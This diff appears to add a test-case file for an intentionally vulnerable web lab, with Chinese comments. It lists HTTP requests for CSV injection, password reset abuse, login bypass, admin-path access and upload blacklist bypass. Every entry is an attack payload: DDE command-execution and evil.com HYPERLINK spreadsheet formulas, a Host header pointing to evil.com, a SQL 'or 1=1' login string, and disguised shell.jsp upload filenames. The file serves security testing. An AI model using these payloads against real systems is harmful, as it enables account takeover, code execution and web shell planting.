@@ -1,0 +1,78 @@
+# 其他漏洞类型测试用例
+# 漏洞类型: CSV Injection, Password Reset, Login Bypass, Unauthorized Access, Blacklist Bypass
+
+# ============================================
+# 1. CSV Injection (CSV 注入)
+# ============================================
+
+# 基础公式注入
+GET /csv/export?user1=user1&email=test@test.com&amount==10+20
+
+# DDE 命令执行
+GET /csv/export?username=user1&email=test@test.com&amount==cmd|' /C calc'!A0
+
+# HYPERLINK 钓鱼
+GET /csv/export?username=user1&email=test@test.com&amount==HYPERLINK("http://evil.com","Click me")
+
+# 订单导出注入
+GET /csv/orders?orderId==HYPERLINK("http://evil.com","Order Details")
+
+
+# ============================================
+# 2. Password Reset (密码重置)
+# ============================================
+
+# Host 头注入
+POST /reset/request?username=user1
+Host: evil.com
+
+# 可预测 Token
+GET /reset/token?username=user1
+
+# Token 复用（多次请求）
+POST /reset/confirm?token=abc123&newPassword=hacked
+
+
+# ============================================
+# 3. Login Bypass (登录绕过)
+# ============================================
+
+# SQL 万能密码
+POST /login/sql?username=admin' or '1'='1&password=anything
+
+# 空密码绕过
+POST /login/empty?username=user1&password=
+
+# 固定 Token
+POST /login/token?username=admin&token=admin123
+
+
+# ============================================
+# 4. Unauthorized Access (未授权访问)
+# ============================================
+
+# 管理员面板
+GET /admin/dashboard
+
+# 用户列表
+GET /admin/users
+
+# 配置文件
+GET /admin/config
+
+
+# ============================================
+# 5. Blacklist Bypass (黑名单绕过)
+# ============================================
+
+# 双重扩展名
+POST /upload/double?filename=shell.jsp.jpg
+
+# MIME 类型伪造
+POST /upload/mime?filename=shell.jsp&contentType=image/jpeg
+
+# 大写绕过
+POST /upload/extension?filename=shell.JSP
+
+# 空字节绕过
+POST /upload/extension?filename=shell.jsp%00.jpg
